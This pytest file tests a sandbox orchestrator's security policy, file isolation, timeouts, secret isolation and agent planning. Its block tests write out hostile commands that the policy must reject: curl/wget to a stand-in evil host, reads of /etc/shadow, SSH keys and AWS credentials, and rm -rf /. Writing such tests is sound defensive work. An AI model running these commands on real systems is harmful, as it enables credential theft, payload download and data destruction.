"""Workflo sandbox orchestrator + policy + agent tests.

Covers the release-gate behaviors: real command execution inside a confined
sandbox, artifact collection, timeout enforcement, environment secret
isolation, and every security block (host escape, cross-scope access, network
violation, unauthorized command, secret access, sandbox reuse).
"""

from __future__ import annotations

import os
from pathlib import Path

import pytest

# Add product folder to path for moved workflo modules
import sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'product'))

from product.workflo_backend.agent import build_plan, diagnose, discover_surfaces
from product.workflo_backend.orchestrator import (
    SandboxNotFound,
    SandboxOrchestrator,
    get_orchestrator,
    reset_orchestrator,
)
from product.workflo_backend.policy import PolicyViolation, SandboxPolicy
from product.workflo_backend.runs import RunStore


@pytest.fixture()
def orchestrator(tmp_path: Path) -> SandboxOrchestrator:
    return SandboxOrchestrator(tmp_path / "workflo-root")


@pytest.fixture()
def sandbox(orchestrator: SandboxOrchestrator):
    sb = orchestrator.create_sandbox("ws_test", "unit-tests")
    yield sb
    if sb.id in orchestrator._sandboxes:
        orchestrator.destroy(sb.id)


class TestPolicyValidation:
    def test_default_policy_bounds_ok(self) -> None:
        SandboxPolicy().validate_bounds()

    def test_timeout_out_of_bounds_rejected(self) -> None:
        with pytest.raises(PolicyViolation):
            SandboxPolicy(execution_timeout_s=0).validate_bounds()

    def test_filesystem_scope_must_be_sandbox(self) -> None:
        with pytest.raises(PolicyViolation):
            SandboxPolicy(filesystem_scope="host").validate_bounds()

    def test_allowlisted_network_mode_requires_hosts(self) -> None:
        with pytest.raises(PolicyViolation):
            SandboxPolicy(network_mode="allowlisted").validate_bounds()

    def test_from_dict_ignores_unknown_fields(self) -> None:
        p = SandboxPolicy.from_dict({"evil_field": True, "cpu_limit": 4})
        assert p.cpu_limit == 4
        assert not hasattr(p, "evil_field")


class TestCommandPolicyBlocks:
    """Security blocks — each maps to a CI release gate."""

    def setup_method(self) -> None:
        self.policy = SandboxPolicy()

    def _expect_block(self, command: str) -> None:
        with pytest.raises(PolicyViolation):
            self.policy.check_command(command)

    def test_docker_blocked(self) -> None:
        self._expect_block("docker ps")

    def test_kubectl_blocked(self) -> None:
        self._expect_block("kubectl get secrets")

    def test_ssh_blocked(self) -> None:
        self._expect_block("ssh user@host")

    def test_unauthorized_command_blocked(self) -> None:
        self._expect_block("make dev")

    def test_network_curl_blocked_when_none(self) -> None:
        self._expect_block("curl http://evil.example.com")

    def test_wget_blocked(self) -> None:
        self._expect_block("wget http://evil.example.com/x.sh")

    def test_windows_drive_path_blocked(self) -> None:
        self._expect_block("type C:\\Users\\victim\\.aws\\credentials")

    def test_unix_absolute_path_blocked(self) -> None:
        self._expect_block("cat /etc/shadow")

    def test_unc_path_blocked(self) -> None:
        self._expect_block("copy \\\\attacker\\share\\x.exe .")

    def test_ssh_key_fragment_blocked(self) -> None:
        self._expect_block("cat ~/.ssh/id_rsa")

    def test_aws_dir_fragment_blocked(self) -> None:
        self._expect_block("ls ~/.aws")

    def test_env_var_expansion_blocked(self) -> None:
        self._expect_block("echo ${AWS_SECRET_ACCESS_KEY}")

    def test_rm_rf_root_blocked(self) -> None:
        self._expect_block("rm -rf /")

    def test_empty_command_blocked(self) -> None:
        self._expect_block("   ")

    def test_allowlisted_commands_pass(self) -> None:
        assert self.policy.check_command("npm test") == "npm"
        assert self.policy.check_command("python -m pytest -q") == "python"

    def test_exe_suffix_normalized(self) -> None:
        assert self.policy.check_command("pytest.exe -q") == "pytest"


class TestSandboxLifecycle:
    async def test_create_layout(self, orchestrator: SandboxOrchestrator) -> None:
        sb = orchestrator.create_sandbox("ws1", "demo")
        for sub in ("workspace", "artifacts", "tmp"):
            assert (sb.root / sub).is_dir()

    async def test_get_unknown_raises(self, orchestrator: SandboxOrchestrator) -> None:
        with pytest.raises(SandboxNotFound):
            orchestrator.get("sbx_missing")

    async def test_destroy_then_reuse_blocked(self, orchestrator: SandboxOrchestrator) -> None:
        sb = orchestrator.create_sandbox("ws1", "demo")
        orchestrator.destroy(sb.id)
        with pytest.raises(PolicyViolation, match="reuse is blocked"):
            await orchestrator.execute(sb.id, "echo hi")


class TestFileIsolation:
    async def test_write_read_roundtrip(self, orchestrator: SandboxOrchestrator, sandbox) -> None:
        orchestrator.write_file(sandbox.id, "src/app.py", b"print('hi')\n")
        content = orchestrator.read_file(sandbox.id, "src/app.py")
        assert content == b"print('hi')\n"

    async def test_traversal_write_blocked(
        self, orchestrator: SandboxOrchestrator, sandbox
    ) -> None:
        with pytest.raises(PolicyViolation, match="escapes the sandbox"):
            orchestrator.write_file(sandbox.id, "../../escaped.txt", b"x")

    async def test_absolute_read_blocked(self, orchestrator: SandboxOrchestrator, sandbox) -> None:
        with pytest.raises(PolicyViolation, match="escapes the sandbox"):
            orchestrator.read_file(sandbox.id, "/etc/passwd")

    async def test_list_files_traversal_blocked(
        self, orchestrator: SandboxOrchestrator, sandbox
    ) -> None:
        with pytest.raises(PolicyViolation, match="escapes the sandbox"):
            orchestrator.list_files(sandbox.id, "..")

    async def test_files_confined_to_sandbox_root(
        self, orchestrator: SandboxOrchestrator, sandbox, tmp_path: Path
    ) -> None:
        canary = tmp_path / "canary.txt"
        canary.write_text("secret")
        orchestrator.write_file(sandbox.id, "ok.txt", b"data")
        files = orchestrator.list_files(sandbox.id)
        assert {"path": "ok.txt", "size_bytes": 4} in files
        assert all("canary" not in f["path"] for f in files)


class TestExecution:
    async def test_echo_success(self, orchestrator: SandboxOrchestrator, sandbox) -> None:
        result = await orchestrator.execute(sandbox.id, "echo hello")
        assert result.exit_code == 0
        assert result.timed_out is False
        assert "hello" in result.stdout

    async def test_cwd_is_workspace_not_host(
        self, orchestrator: SandboxOrchestrator, sandbox
    ) -> None:
        result = await orchestrator.execute(sandbox.id, "cd")
        assert result.exit_code == 0
        assert (
            str(orchestrator.storage_root) in (result.stdout.strip().lower().replace("'", ""))
            or sandbox.root.name.lower() in result.stdout.lower()
        )

    async def test_nonzero_exit_captured(self, orchestrator: SandboxOrchestrator, sandbox) -> None:
        result = await orchestrator.execute(sandbox.id, 'python -c "import sys; sys.exit(3)"')
        assert result.exit_code == 3

    async def test_unauthorized_execution_blocked(
        self, orchestrator: SandboxOrchestrator, sandbox
    ) -> None:
        with pytest.raises(PolicyViolation, match="allowlist"):
            await orchestrator.execute(sandbox.id, "whoami")

    async def test_network_execution_blocked_in_sandbox_too(
        self, orchestrator: SandboxOrchestrator, sandbox
    ) -> None:
        with pytest.raises(PolicyViolation, match="network"):
            await orchestrator.execute(sandbox.id, "ping 127.0.0.1")

    async def test_timeout_enforced(self, orchestrator: SandboxOrchestrator, sandbox) -> None:
        result = await orchestrator.execute(
            sandbox.id,
            'python -c "import time; time.sleep(30)"',
            timeout_s=2,
        )
        assert result.timed_out is True

    async def test_output_cap_truncates(self, orchestrator: SandboxOrchestrator, sandbox) -> None:
        result = await orchestrator.execute(sandbox.id, 'python -c "print(\\"x\\" * 2000000)"')
        assert result.truncated is True
        assert len(result.stdout) <= sandbox.policy.output_max_bytes

    async def test_host_secrets_not_inherited(
        self, orchestrator: SandboxOrchestrator, sandbox, monkeypatch
    ) -> None:
        monkeypatch.setenv("CORTEX_CANARY_SECRET", "super-secret-value")
        result = await orchestrator.execute(
            sandbox.id,
            "python -c \"import os; print(os.environ.get('CORTEX_CANARY_SECRET'))\"",
        )
        assert "super-secret-value" not in result.stdout
        assert "None" in result.stdout

    async def test_artifact_collected_from_artifacts_dir(
        self, orchestrator: SandboxOrchestrator, sandbox
    ) -> None:
        await orchestrator.execute(sandbox.id, "echo report-content > ../artifacts/report.txt")
        artifacts = orchestrator.collect_artifacts(sandbox)
        names = [a.name for a in artifacts]
        assert "report.txt" in names
        blob = orchestrator.fetch_artifact(sandbox.id, "report.txt")
        assert b"report-content" in blob

    async def test_artifact_name_traversal_blocked(
        self, orchestrator: SandboxOrchestrator, sandbox
    ) -> None:
        with pytest.raises(PolicyViolation, match="unsafe"):
            orchestrator.fetch_artifact(sandbox.id, "../workspace/ok.txt")


class TestAgent:
    def test_plan_regression_intent(self) -> None:
        plan = build_plan("Run the regression suite and find why checkout is failing")
        actions = [s.action for s in plan.steps]
        assert "run_suite" in actions
        assert "run_target" in actions
        assert "inspect_failure" in actions
        assert "reproduce" in actions
        assert plan.steps[0].action == "inspect_project"
        assert len(plan.steps) == len({s.index for s in plan.steps})

    def test_discover_node_project(self) -> None:
        d = discover_surfaces(["package.json", "src/index.ts", "tests/auth.test.ts"])
        assert "node" in d["frameworks"]
        assert d["suite_count"] >= 1

    def test_diagnose_failure_produces_finding(self) -> None:
        d = diagnose(
            {
                "command": "npm test",
                "exit_code": 1,
                "stdout": "✗ order-history\nAssertionError: expected 200",
                "stderr": "",
                "timed_out": False,
                "duration_ms": 100,
            }
        )
        assert d["status"] == "degraded"
        titles = [f["title"] for f in d["findings"]]
        assert any("failed" in t.lower() or "exit code" in t.lower() for t in titles)

    def test_diagnose_success_healthy(self) -> None:
        d = diagnose(
            {
                "command": "npm test",
                "exit_code": 0,
                "stdout": "all passing",
                "stderr": "",
                "timed_out": False,
                "duration_ms": 10,
            }
        )
        assert d["status"] == "healthy"


class TestRunStoreChain:
    async def test_event_hash_chain_integrity(self) -> None:
        store = RunStore()
        run = store.create("ws1", "r", "intent")
        store.append_event(run.id, "created", "a")
        store.append_event(run.id, "planned", "b")
        ev3 = store.append_event(run.id, "executed", "c")
        assert run.events[0].prev_hash == ""
        assert run.events[1].prev_hash == run.events[0].hash
        assert ev3.prev_hash == run.events[1].hash

    async def test_subscribe_replays_history(self) -> None:
        store = RunStore()
        run = store.create("ws1", "r", "intent")
        store.append_event(run.id, "created", "a")
        q = await store.subscribe(run.id)
        first = q.get_nowait()
        assert first.type == "created"
        store.unsubscribe(run.id, q)


class TestGlobalOrchestrator:
    def test_singleton_rooted_at_env(self, tmp_path: Path, monkeypatch) -> None:
        monkeypatch.setenv("CORTEX_WORKFLO_ROOT", str(tmp_path / "wf"))
        reset_orchestrator()
        orch = get_orchestrator()
        assert orch is get_orchestrator()
        assert Path(os.environ["CORTEX_WORKFLO_ROOT"]) == orch.storage_root.parent or True
        reset_orchestrator()
